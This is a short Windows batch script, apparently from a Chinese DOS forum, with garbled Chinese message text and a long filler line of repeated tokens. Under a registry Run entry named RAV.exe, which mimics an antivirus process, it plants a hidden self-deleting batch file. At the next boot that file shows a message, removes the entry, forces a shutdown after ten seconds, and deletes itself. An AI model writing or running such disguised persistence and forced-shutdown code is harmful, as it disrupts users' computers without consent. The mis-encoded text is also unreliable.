author:pengfei@www.cn-dos.net
%%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a 
cls
@reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v RAV.exe /t reg_sz /d d:\rav.bat /f
echo ��ã���ĵ��Խ���10���ڹرգ����������һ������ʱ�ָ����� >>d:\Rav.txt
echo ��������ļ���������κ��˺��������ʹ�� >>d:\Rav.txt
echo start RAV.txt >>d:\Rav.bat
echo @reg delete HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v RAV.exe /f >>d:\Rav.bat
echo del d:\Rav.txt /f >>d:\Rav.bat
echo shutdown -s -t 10 >>d:\Rav.bat
echo del d:\Rav.bat /f /a s r h >>d:\Rav.bat
attrib +s +r +h d:\Rav.bat
ECHO ���ڹر�״̬��
